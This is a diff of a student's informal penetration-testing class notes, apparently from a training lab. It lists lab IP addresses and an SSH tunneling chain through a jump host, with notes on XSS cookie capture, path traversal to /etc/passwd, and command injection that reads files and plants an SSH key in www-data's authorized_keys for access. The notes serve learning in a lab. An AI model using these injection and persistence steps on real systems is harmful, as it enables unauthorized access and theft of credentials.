@@ -9,12 +9,20 @@ GALE-507-M
 
 iv4CRgEPySw8bJM 
 
+JUMP
 10.50.44.245
 
 10.50.20.250:8000/
 
 Jo 10.50.47.112
 Wat 10.50.37.149
+
+
+Lin-ops
+192.168.65.20, 10.50.23.212
+
+Win-ops
+192.168.65.10, 10.50.33.144
 
 
 Penetration Testing
@@ -119,11 +127,94 @@ IH> ssh -S /tmp/tgt/ Dummy -O forward -D 9050
 
 
 
+lin-ops> ssh -MS /tmp/gray student@10.50.44.245
+jump> 
+lin-ops> ssh -S /tmp/gray dummy -O forward -L 1630:192.168.28.120:4242
+lin-ops> ssh -MS /tmp/tgt student@127.0.0.1 -p 1630
+lin-ops> ssh -S /tmp/tgt dummy -O forward -D 9050
 
 
 
 
 
+
+
+
+
+Vulnerability and Exploitation Research
+_______________________________________________________________________________________________________________________
+
+Just google good fuckin nerd
+
+
+
+
+
+Web Exploitation Day 1
+_______________________________________________________________________________________________________________________
+
+THIS SHIT IS IMPORTENANT
+GET / HTTP/1.1
+We will be using Developer Console but not wireshark or tcpdump
+
+
+HTTP
+A select Few: GET, POST, head, put
+HTTP Response Codes
+10X == Informational
+2XX == Success
+30X == Redirection
+4XX == Client Error
+5XX == Server Error
+
+inspect and look at network
+If 80 is open then immediately make a tunnel and open the web page
+.JS is javascript, java is a different language
+
+
+Enumeration
+ROBOTS.TXT 
+nmap -T4 -p 80 --script http-enum.nse ipaddr
+^ may or may not catch but ROBOTS is crucial 
+NEED FOR THE TEST 
+Burp suite for outside of class
+
+Reflected XSS 
+Needs a pretty secure server that isn't gong to execute this code, and a vulnerable browser
+Most common form
+Transient, occurs in error messages
+Delivered through intermediate media uch as an email link
+Characters that are normally illegal in URLs can be Base64 encoded
+
+Stored XSS
+Resides on vulnerable site, only requires user to visit page
+Capturing cookie
+document.cookie
+Capturing Keystrokes
+bind KEYDOWN and KEYUP
+Cap sensitive data
+ip document.body.innerHTML
+
+Server side injection view_image.php?file=../../etc/passwd
+../../../../../etc/passwd
+/var/www/html-userdata
+Malicious File upload with the sipcy 
+system("ping -c 1 ".$_GET["ip"]);
+; cat /etc/passwd
+
+
+System to ping (X.X.X.X ): 
+; mkdir /var/www/ssh
+ssh-keygen -t rsa -b 4096
+cd .ssh
+id_rsa is private key .pub is public
+cat public key
+grab everything and move it to a vim
+; echo "ssh-rsa
+student@lin-ops" > /var/www/.ssh/authorized keys
+paste in the http, try to cat /var/www/.ssh/authorized_keys to read it
+ssh -i id_rsa www-data@10.50.45.112
+no password needed cause gaemr
 
 
 
